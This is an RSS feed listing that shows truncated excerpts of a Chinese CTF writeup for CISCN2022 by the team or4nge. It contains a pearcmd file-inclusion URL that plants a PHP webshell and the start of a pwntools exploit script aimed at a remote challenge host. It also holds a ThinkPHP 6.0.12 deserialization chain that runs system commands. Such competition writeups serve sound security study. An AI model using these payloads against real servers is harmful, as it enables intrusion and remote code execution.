channel.description: Recent content in CISCN on or4nge

item.title: CISCN2022 初赛 Writeup by or4nge
item.description: Web include p牛的PHP裸文件本地包含 /index.php?+config-create+/&file=../../../../usr/local/lib/php/pearcmd&/<? eval($_POST[1]);?>+/tmp/hello.php Pwn very_old_school 神奇的gadget，老题，改read的got为write泄露地址，最后onegadget即可。 from pwn import * import sys context(os='linux', arch='amd64', log_level='debug') if len(sys.argv) < 2: debug = True else: debug = False if debug: p = process("./very_old_school") libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so") else: p = remote("39.104.61.18", 5656) libc = ELF('./libc-2.27.so') elf = ELF('./very_old_school') ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.

item.title: CISCN2022 初赛 Writeup by or4nge
item.description: Web ezpop tp6.0.12 的反序列化洞，直接用现成的链的打就行 <?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = ''){ $this->lazySave = True; $this->data = ['key' => ["cat /flag.txt"]]; $this->exists = True; $this->table = $obj; $this->withAttr = ['key' => ['system']]; $this->json = ['key',['key']]; $this->jsonAssoc = True; } } } namespace think\model{ use think\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\model\Pivot(new think\model\Pivot())))); } Pwn login-nomal 可见字符 shellcode，调用 ae64 脚本，rdx 直接打通
